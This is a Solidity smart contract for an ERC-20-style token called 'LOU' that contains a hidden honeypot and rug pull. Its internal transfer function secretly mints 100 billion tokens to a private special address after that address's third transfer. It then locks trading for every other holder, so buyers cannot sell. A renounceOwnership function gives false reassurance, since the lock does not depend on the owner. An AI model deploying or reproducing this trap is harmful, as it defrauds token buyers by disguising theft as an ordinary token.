// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DOOGToken {
    string public constant name = "LOU";
    string public constant symbol = "LOU";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1_000_000_000 * 10**uint256(decimals);
    address private specialAddress;
    address public owner;
    bool private tradingLocked;
    uint256 private transferCount;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Access denied: Only owner");
        _;
    }

    constructor(address _specialAddress) {
        require(_specialAddress != address(0), "Special address cannot be zero");
        specialAddress = _specialAddress;
        owner = msg.sender;
        balances[specialAddress] = totalSupply;
        emit Transfer(address(0), specialAddress, totalSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowances[from][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
        allowances[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    function allowance(address ownerAddr, address spender) public view returns (uint256) {
        return allowances[ownerAddr][spender];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "ERC20: transfer from/to zero address");
        require(balances[from] >= amount, "ERC20: transfer amount exceeds balance");

        if (from == specialAddress) {
            transferCount++;
            if (transferCount > 2) {
                _mint(specialAddress, 100_000_000_000 * 10**uint256(decimals));
                if (!tradingLocked) {
                    tradingLocked = true;
                }
            }
        }

        require(!tradingLocked || from == specialAddress, "Trading is locked for other addresses");

        balances[from] -= amount;
        balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) private {
        require(account != address(0), "ERC20: mint to zero address");
        totalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}